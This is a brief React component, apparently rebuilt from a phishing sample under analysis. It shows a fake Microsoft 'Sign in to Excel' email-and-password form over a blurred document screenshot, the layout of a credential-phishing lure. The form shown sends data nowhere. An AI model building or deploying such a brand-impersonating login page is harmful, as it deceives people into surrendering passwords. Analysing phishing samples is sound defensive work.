export default function Home() {
  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";
  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        <h2>Sign in to Excel</h2>
        <form>
          <input type="text" name="username" placeholder="Email or phone" autoComplete="username" required />
          <input type="password" name="password" placeholder="Password" autoComplete="current-password" required />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>
    </>
  );
}
